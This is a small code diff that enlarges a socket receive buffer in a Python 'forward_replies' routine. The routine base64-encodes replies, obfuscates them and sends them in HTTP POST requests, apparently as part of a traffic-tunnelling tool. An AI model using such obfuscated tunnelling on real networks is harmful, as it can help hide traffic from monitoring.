@@ -160,7 +160,7 @@ def forward_replies():
 		logging.debug("Forward replies thread locked.")
 		socket_event.wait()
 		logging.debug("Forward replies thread unlocked.")
-		reply = forward_socket.recv(2048)
+		reply = forward_socket.recv(4096)
 		headers = create_post_header()
 		payload = base64.b64encode(reply)
 		payload = obf.randomize_payload(payload.decode("ascii"))
